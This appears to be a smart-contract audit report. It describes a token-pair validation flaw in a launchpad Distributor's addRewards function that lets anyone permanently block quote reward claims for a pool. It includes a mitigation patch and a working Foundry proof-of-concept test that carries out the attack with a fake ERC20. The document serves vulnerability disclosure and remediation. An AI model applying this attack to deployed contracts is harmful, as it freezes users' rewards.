  "body": "## Summary\n\nAn attacker can call:\n\n```solidity\naddRewards(launchAsset, fakeToken, 0, X)\n```\n\naddRewards finds the pool via launchAsset but never checks that token1 == rs.quoteAsset. It:\n* calls rs.addQuoteRewards(launchAsset, fakeToken, X)\n* credits totalPendingRewards[fakeToken] += X\n* pulls fakeToken via transferFrom\n\nInternally, the pool accrues quote pending for users. Later, claimRewards(launchAsset) tries to pay out the real quote token and calls:\n\n```solidity\n_decreaseTotalPending(realQuote, amount)\n```\n\nThis underflows (totalPendingRewards[realQuote] == 0) → ClaimAmountExceedsTotalPendingRewards() → DoS for all quote claims on that pool.\n\n## Affected code\n\n* contracts/launchpad/Distributor.sol — addRewards(...) selects the pool by token0/token1 but never enforces that the “other” token equals rs.quoteAsset; it then credits pending under the attacker-supplied token and transfers that token in.\n* contracts/launchpad/Distributor.sol — _decreaseTotalPending(quote, amount) reverts when user later claims real quote rewards because totalPendingRewards[realQuote] wasn’t credited.\n\n## Root cause\n* Missing invariant: the token pair passed into addRewards is not validated to match the established {launchAsset, rs.quoteAsset} pair. As a result, external input decides which token key is used for both totalPendingRewards[...] and the incoming transfer.\n\n## Impact\n\n* Per-pool permanent DoS of quote reward claims (until a migration/upgrade).\n* Funds accounting becomes inconsistent: users see positive pendingQuote but the distributor has pending tracked under a different token key.\n\n## Attack / trigger scenario\n\n1. Pool exists and has totalShares > 0.\n2. Attacker deploys fakeToken and approves the Distributor.\n3. Calls addRewards(launchAsset, fakeToken, 0, X).\n4. Users now have pendingQuote > 0 internally, but totalPendingRewards[realQuote] == 0 and totalPendingRewards[fakeToken] == X.\n5. Any claimRewards(launchAsset) reverts with ClaimAmountExceedsTotalPendingRewards.\n\n## Recommended mitigation steps\n\nEnforce that the provided pair exactly matches the configured pool pair and use the canonical quote asset for accounting and transfers:\n\n```solidity\n// Distributor.sol\nerror InvalidQuoteAsset();\n\nfunction addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {\n    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) =\n        (token0, token1, amount0, amount1);\n\n    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);\n    if (rs.quoteAsset == address(0)) {\n        rs = RewardsTrackerStorage.getRewardPool(token1);\n        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();\n        (launchAsset, quoteAsset, launchAssetAmount, quoteAssetAmount) = (token1, token0, amount1, amount0);\n    }\n\n    // NEW: enforce the other token matches the canonical quote asset\n    if (quoteAsset != rs.quoteAsset) revert InvalidQuoteAsset();\n\n    if (rs.totalShares == 0) revert NoSharesToIncentivize();\n\n    if (launchAssetAmount > 0) {\n        rs.addBaseRewards(launchAsset, launchAssetAmount);\n        _increaseTotalPending(launchAsset, launchAssetAmount);\n        launchAsset.safeTransferFrom(msg.sender, address(this), uint256(launchAssetAmount));\n    }\n\n    if (quoteAssetAmount > 0) {\n        // Use canonical quote asset for accounting and transfer\n        rs.addQuoteRewards(launchAsset, rs.quoteAsset, quoteAssetAmount);\n        _increaseTotalPending(rs.quoteAsset, quoteAssetAmount);\n        rs.quoteAsset.safeTransferFrom(msg.sender, address(this), uint256(quoteAssetAmount));\n    }\n}\n```\nThis both validates the pair and removes reliance on untrusted quoteAsset for accounting/transfer.",
  "proof_of_concept": "A self-contained Foundry test that:\n* Creates non-zero shares via increaseStake(token, user, 1) as Launchpad would.\n* Mints/approves fakeToken and calls addRewards(token, fakeToken, 0, 1e18).\n* Asserts pendingQuote > 0 for the user.\n* Asserts totalPendingRewards(realQuote) == 0 and totalPendingRewards(fakeToken) == 1e18.\n* Calls claimRewards(token) and asserts revert with ClaimAmountExceedsTotalPendingRewards.\n\nHow to run:\n```bash\nforge test --match-test submissionValidity\n```\n\nFile: test/c4-poc/PoCLaunchpad_AddRewards_TokenPairMismatch_DoS.t.sol\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {LaunchpadTestBase} from \"./LaunchpadTestBase.sol\";\nimport {Distributor} from \"contracts/launchpad/Distributor.sol\";\nimport {ERC20Harness} from \"../harnesses/ERC20Harness.sol\";\n\n/*\n================================================================================\nPoC: Token–pair mismatch in addRewards lets anyone brick payouts (per-pool DoS)\n================================================================================\n\nHow to run (per sponsor rules):\n- This single test compiles and runs with:\n    forge test --match-test submissionValidity\n\nHigh-level exploit:\n- Attacker calls addRewards(launchAsset, fakeToken, 0, X).\n- Pool accrues *quote* rewards internally (pendingQuote rises for users),\n  but the Distributor credits totalPendingRewards under the *attacker's fake token*.\n- Later, when a user legitimately claims quote rewards (the real quote asset),\n  _decreaseTotalPending(realQuote, amount) underflows and reverts with\n  ClaimAmountExceedsTotalPendingRewards — effectively DoSing quote claims.\n\nWhat this PoC proves:\n1) Pool has non-zero shares so addRewards is permitted by the contract.\n2) Adding \"quote\" rewards using a fake token increases user pendingQuote internally.\n3) Distributor.totalPendingRewards(realQuote) remains 0 while fakeToken is credited.\n4) A legitimate claim for real quote rewards reverts with the exact custom error.\n\nRoot cause (for reviewers):\n- Missing invariant in Distributor.addRewards: no validation that the supplied `quoteAsset`\n  equals the canonical rs.quoteAsset for the pool. Accounting and transfers rely on the\n  untrusted input token, desynchronizing global pending vs. pool internals.\n\nExpected fix (not implemented here; reference for triage):\n- Enforce that {token0, token1} == {launchAsset, rs.quoteAsset} (order-agnostic),\n  and use rs.quoteAsset for accounting/transfer in the quote branch.\n*/\n\ncontract PoCLaunchpad_AddRewards_TokenPairMismatch_DoS is LaunchpadTestBase {\n    function test_submissionValidity() public {\n        // -----------------------------------------------------------------------------\n        // GIVEN: Test Base already deployed Launchpad stack with a live rewards pool.\n        // - `launchpad`, `distributor`, `quoteToken` (real quote), and `token` (launch asset)\n        //   are set up in LaunchpadTestBase.setUp().\n        // - Pair initialization occurs during launch; rewards pool exists for `token`.\n        // -----------------------------------------------------------------------------\n\n        // -----------------------------------------------------------------------------\n        // GIVEN: Pool must have >0 shares; otherwise addRewards reverts with NoSharesToIncentivize.\n        // We simulate the Launchpad increasing stake (onlyLaunchpad), granting `user` a single share.\n        // This mirrors the legitimate lifecycle and unlocks addRewards.\n        // -----------------------------------------------------------------------------\n        vm.prank(address(launchpad));\n        Distributor(distributor).increaseStake(token, user, 1); // minimal positive shares\n\n        // -----------------------------------------------------------------------------\n        // AND: The attacker has an arbitrary ERC20 (fake \"quote\") funded and approved.\n        // Any ERC20 works; using ERC20Harness for simplicity.\n        // -----------------------------------------------------------------------------\n        address attacker = makeAddr(\"attacker\");\n        ERC20Harness fakeQuote = new ERC20Harness(\"FakeQuote\", \"FKE\");\n        fakeQuote.mint(attacker, 1e24); // fund attacker sufficiently\n\n        vm.startPrank(attacker);\n        fakeQuote.approve(distributor, type(uint256).max);\n\n        // -----------------------------------------------------------------------------\n        // WHEN: The attacker calls addRewards(launchAsset, fakeToken, 0, X).\n        //\n        // Internals (root-cause tie-in):\n        // - Distributor.addRewards(...) identifies the pool via `token` (launch asset).\n        // - It *does not enforce* that the other token equals rs.quoteAsset.\n        // - rs.addQuoteRewards(...) increases users' internal pendingQuote.\n        // - _increaseTotalPending(quoteAsset, X) credits the *attacker-supplied* fake token key.\n        // - The Distributor receives `fakeQuote` via transferFrom, not the real quote token.\n        // Result: Internal pool state says \"users have quote pending\", but the Distributor's\n        // totalPendingRewards[realQuote] remains 0 (all credited to fakeQuote).\n        // -----------------------------------------------------------------------------\n        uint128 X = 1e18; // 1.0 unit of \"quote\" incentives\n        Distributor(distributor).addRewards(token, address(fakeQuote), 0, X);\n        vm.stopPrank();\n\n        // -----------------------------------------------------------------------------\n        // THEN: Sanity/invariant checks post-attack:\n        // - User's pendingQuote > 0 (internal pool accounting accrued quote rewards).\n        // - Distributor's global pending for the REAL quote is still 0.\n        // - Distributor's global pending for the FAKE token equals X.\n        // -----------------------------------------------------------------------------\n        (, uint256 pendingQuote) = Distributor(distributor).getPendingRewards(token, user);\n        assertGt(pendingQuote, 0, \"pendingQuote should accrue for user\");\n\n        // Real quote asset received NOTHING at the Distributor level (desync bug).\n        assertEq(\n            Distributor(distributor).totalPendingRewards(address(quoteToken)),\n            0,\n            \"real quote pending must remain 0\"\n        );\n        // Entire credit went to the fake token key.\n        assertEq(\n            Distributor(distributor).totalPendingRewards(address(fakeQuote)),\n            uint256(X),\n            \"fake token should be credited in Distributor\"\n        );\n\n        // -----------------------------------------------------------------------------\n        // AND: Impact — DoS on legitimate claims.\n        //\n        // The claim path attempts to pay the canonical rs.quoteAsset (the REAL quote token).\n        // Distributor._decreaseTotalPending(realQuote, amount) checks:\n        //     if (totalPendingRewards[realQuote] < amount) revert ClaimAmountExceedsTotalPendingRewards();\n        // Since the real quote was never credited, this underflows and reverts, DoSing claims.\n        // -----------------------------------------------------------------------------\n        vm.startPrank(user);\n        vm.expectRevert(Distributor.ClaimAmountExceedsTotalPendingRewards.selector);\n        Distributor(distributor).claimRewards(token); // reverts as expected\n        vm.stopPrank();\n    }\n}\n```",
